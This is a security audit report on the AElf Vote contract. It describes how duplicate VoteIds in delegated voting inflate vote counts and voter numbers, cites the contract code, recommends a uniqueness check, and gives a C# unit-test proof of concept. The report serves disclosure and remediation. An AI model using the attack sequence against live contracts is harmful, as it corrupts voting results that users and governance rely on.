# Audit Report

## Title
Vote Count Inflation via Duplicate VoteId in Delegated Voting

## Summary
The Vote contract allows sponsors of delegated voting items (IsLockToken = false) to submit multiple votes with the same VoteId, causing permanent vote count inflation without token backing. This violates the core voting integrity invariant that vote counts must accurately represent actual voting activity.

## Finding Description

The vulnerability exists in the `Vote()` function's handling of delegated voting scenarios where the sponsor provides the VoteId.

**Vulnerable Code Path:**

In delegated voting (IsLockToken = false), the validation only checks that the sponsor is the sender and that VoteId is non-null, but never validates VoteId uniqueness: [1](#0-0) 

When processing votes, the contract unconditionally overwrites any existing VotingRecord: [2](#0-1) 

The `UpdateVotingResult()` function always increments vote counts and votersCount without checking for duplicate submissions: [3](#0-2) 

The `UpdateVotedItems()` function adds the VoteId to ActiveVotes without duplicate detection: [4](#0-3) 

During withdrawal, only ONE instance is removed from ActiveVotes, and only the last record's amount is subtracted: [5](#0-4) 

**Attack Sequence:**
1. Attacker calls `Register()` to create a delegated voting item (IsLockToken = false) - anyone can be a sponsor: [6](#0-5) 

2. Attacker calls `Vote(voteId="X", voter=Alice, amount=100, option="A")`
   - VotingRecords["X"] = {amount:100, option:"A"}
   - VotingResult["A"] = 100, votersCount = 1
   - ActiveVotes = ["X"]

3. Attacker calls `Vote(voteId="X", voter=Alice, amount=200, option="B")` 
   - VotingRecords["X"] = {amount:200, option:"B"} (overwritten)
   - VotingResult["A"] = 100, VotingResult["B"] = 200, votersCount = 2
   - ActiveVotes = ["X", "X"]

4. Attacker calls `Withdraw(voteId="X")`
   - VotingResult["B"] -= 200 (back to 0)
   - ActiveVotes.Remove("X") removes only ONE → ActiveVotes = ["X"]
   - votersCount stays at 2 (because ActiveVotes.Any() is still true)
   - **Final state:** VotingResult["A"] = 100 (phantom vote), votersCount = 2

## Impact Explanation

**Critical State Corruption:**
- **Permanent Vote Inflation**: Phantom votes for "A" (100) remain in VotingResult without any token backing or withdrawable record
- **Metric Manipulation**: votersCount is artificially inflated (2 instead of 0), misrepresenting actual participation
- **Unwithdrawable Votes**: The first vote's data is permanently lost, while its vote count remains inflated
- **ActiveVotes Corruption**: Contains references to withdrawn VoteIds

This breaks the fundamental voting invariant that vote totals must accurately reflect actual, withdrawable votes. While delegated voting is intended for legitimate use cases (like the Election contract), the lack of VoteId uniqueness validation allows malicious sponsors to corrupt voting results.

Note: The Election contract implements its own safeguard against this issue: [7](#0-6) 

However, the base Vote contract is a public contract that can be used by other contracts or directly by users to create voting items, and it lacks this protection.

## Likelihood Explanation

**High Likelihood:**
- Any user can call `Register()` to become a sponsor of a delegated voting item
- The `Vote()` function is publicly callable by the sponsor with arbitrary VoteId values
- No rate limiting, economic cost (beyond tx fees), or duplicate detection exists
- The attack requires only simple repeated calls with the same VoteId
- No special timing or complex preconditions required
- The vulnerability creates valid-looking transactions that pass all existing checks

## Recommendation

Add VoteId uniqueness validation in the `AssertValidVoteInput()` method for delegated voting scenarios:

```csharp
private VotingItem AssertValidVoteInput(VoteInput input)
{
    var votingItem = AssertVotingItem(input.VotingItemId);
    Assert(input.Option.Length <= VoteContractConstants.OptionLengthLimit, "Invalid input.");
    Assert(votingItem.Options.Contains(input.Option), $"Option {input.Option} not found.");
    Assert(votingItem.CurrentSnapshotNumber <= votingItem.TotalSnapshotNumber,
        "Current voting item already ended.");
    if (!votingItem.IsLockToken)
    {
        Assert(votingItem.Sponsor == Context.Sender, "Sender of delegated voting event must be the Sponsor.");
        Assert(input.Voter != null, "Voter cannot be null if voting event is delegated.");
        Assert(input.VoteId != null, "Vote Id cannot be null if voting event is delegated.");
        // ADD THIS CHECK:
        Assert(State.VotingRecords[input.VoteId] == null, "Vote Id already exists.");
    }
    else
    {
        var votingResultHash = GetVotingResultHash(votingItem.VotingItemId, votingItem.CurrentSnapshotNumber);
        var votingResult = State.VotingResults[votingResultHash];
        input.Voter = Context.Sender;
        input.VoteId = Context.GenerateId(Context.Self, votingResult.VotesAmount.ToBytes(false));
    }

    return votingItem;
}
```

## Proof of Concept

```csharp
[Fact]
public async Task VoteContract_DuplicateVoteId_InflatesVoteCount()
{
    // Step 1: Register delegated voting item (IsLockToken = false)
    var votingItem = await RegisterVotingItemAsync(100, 3, false, DefaultSender, 1);
    
    // Step 2: Submit first vote with VoteId="X" for option A
    var voteId = HashHelper.ComputeFrom("duplicate_vote_id");
    await VoteContractStub.Vote.SendAsync(new VoteInput
    {
        VotingItemId = votingItem.VotingItemId,
        Voter = Accounts[1].Address,
        VoteId = voteId,
        Option = votingItem.Options[0], // Option A
        Amount = 100
    });
    
    // Step 3: Submit second vote with SAME VoteId for option B
    await VoteContractStub.Vote.SendAsync(new VoteInput
    {
        VotingItemId = votingItem.VotingItemId,
        Voter = Accounts[1].Address,
        VoteId = voteId,
        Option = votingItem.Options[1], // Option B
        Amount = 200
    });
    
    // Verify: Both options have votes, votersCount = 2
    var resultBeforeWithdraw = await VoteContractStub.GetVotingResult.CallAsync(new GetVotingResultInput
    {
        VotingItemId = votingItem.VotingItemId,
        SnapshotNumber = 1
    });
    resultBeforeWithdraw.Results[votingItem.Options[0]].ShouldBe(100); // Option A: 100
    resultBeforeWithdraw.Results[votingItem.Options[1]].ShouldBe(200); // Option B: 200
    resultBeforeWithdraw.VotersCount.ShouldBe(2); // 2 voters counted
    
    // Step 4: Withdraw the duplicate VoteId
    await VoteContractStub.Withdraw.SendAsync(new WithdrawInput { VoteId = voteId });
    
    // VULNERABILITY: Option A still has 100 phantom votes, votersCount = 2
    var resultAfterWithdraw = await VoteContractStub.GetVotingResult.CallAsync(new GetVotingResultInput
    {
        VotingItemId = votingItem.VotingItemId,
        SnapshotNumber = 1
    });
    resultAfterWithdraw.Results[votingItem.Options[0]].ShouldBe(100); // PHANTOM VOTE!
    resultAfterWithdraw.Results[votingItem.Options[1]].ShouldBe(0);   // Withdrawn correctly
    resultAfterWithdraw.VotersCount.ShouldBe(2); // Still 2 instead of 0!
    
    // Verify voting record only contains the last (withdrawn) vote
    var record = await VoteContractStub.GetVotingRecord.CallAsync(voteId);
    record.IsWithdrawn.ShouldBe(true);
    record.Option.ShouldBe(votingItem.Options[1]); // Only B is recorded
    record.Amount.ShouldBe(200); // First vote (100 for A) is lost
}
```

### Citations

**File:** contract/AElf.Contracts.Vote/VoteContract.cs (L20-39)
```csharp
    public override Empty Register(VotingRegisterInput input)
    {
        var votingItemId = AssertValidNewVotingItem(input);

        if (State.TokenContract.Value == null)
            State.TokenContract.Value =
                Context.GetContractAddressByName(SmartContractConstants.TokenContractSystemName);

        // Accepted currency is in white list means this token symbol supports voting.
        var isInWhiteList = State.TokenContract.IsInWhiteList.Call(new IsInWhiteListInput
        {
            Symbol = input.AcceptedCurrency,
            Address = Context.Self
        }).Value;
        Assert(isInWhiteList, "Claimed accepted token is not available for voting.");

        // Initialize voting event.
        var votingItem = new VotingItem
        {
            Sponsor = Context.Sender,
```

**File:** contract/AElf.Contracts.Vote/VoteContract.cs (L117-117)
```csharp
        State.VotingRecords[input.VoteId] = votingRecord;
```

**File:** contract/AElf.Contracts.Vote/VoteContract.cs (L146-161)
```csharp
    private void UpdateVotedItems(Hash voteId, Address voter, VotingItem votingItem)
    {
        var votedItems = State.VotedItemsMap[voter] ?? new VotedItems();
        var voterItemIndex = votingItem.VotingItemId.ToHex();
        if (votedItems.VotedItemVoteIds.ContainsKey(voterItemIndex))
            votedItems.VotedItemVoteIds[voterItemIndex].ActiveVotes.Add(voteId);
        else
            votedItems.VotedItemVoteIds[voterItemIndex] =
                new VotedIds
                {
                    ActiveVotes = { voteId }
                };

        votedItems.VotedItemVoteIds[voterItemIndex].WithdrawnVotes.Remove(voteId);
        State.VotedItemsMap[voter] = votedItems;
    }
```

**File:** contract/AElf.Contracts.Vote/VoteContract.cs (L169-181)
```csharp
    private void UpdateVotingResult(VotingItem votingItem, string option, long amount)
    {
        // Update VotingResult based on this voting behaviour.
        var votingResultHash = GetVotingResultHash(votingItem.VotingItemId, votingItem.CurrentSnapshotNumber);
        var votingResult = State.VotingResults[votingResultHash];
        if (!votingResult.Results.ContainsKey(option)) votingResult.Results.Add(option, 0);

        var currentVotes = votingResult.Results[option];
        votingResult.Results[option] = currentVotes.Add(amount);
        votingResult.VotersCount = votingResult.VotersCount.Add(1);
        votingResult.VotesAmount = votingResult.VotesAmount.Add(amount);
        State.VotingResults[votingResultHash] = votingResult;
    }
```

**File:** contract/AElf.Contracts.Vote/VoteContract.cs (L210-218)
```csharp
        votedItems.VotedItemVoteIds[votingItem.VotingItemId.ToHex()].ActiveVotes.Remove(input.VoteId);
        votedItems.VotedItemVoteIds[votingItem.VotingItemId.ToHex()].WithdrawnVotes.Add(input.VoteId);
        State.VotedItemsMap[votingRecord.Voter] = votedItems;

        var votingResult = State.VotingResults[votingResultHash];
        votingResult.Results[votingRecord.Option] =
            votingResult.Results[votingRecord.Option].Sub(votingRecord.Amount);
        if (!votedItems.VotedItemVoteIds[votingRecord.VotingItemId.ToHex()].ActiveVotes.Any())
            votingResult.VotersCount = votingResult.VotersCount.Sub(1);
```

**File:** contract/AElf.Contracts.Vote/VoteContract.cs (L384-389)
```csharp
        if (!votingItem.IsLockToken)
        {
            Assert(votingItem.Sponsor == Context.Sender, "Sender of delegated voting event must be the Sponsor.");
            Assert(input.Voter != null, "Voter cannot be null if voting event is delegated.");
            Assert(input.VoteId != null, "Vote Id cannot be null if voting event is delegated.");
        }
```

**File:** contract/AElf.Contracts.Election/ElectionContract_Elector.cs (L432-433)
```csharp
        var voteId = GenerateVoteId(input);
        Assert(State.LockTimeMap[voteId] == 0, "Vote already exists.");
```
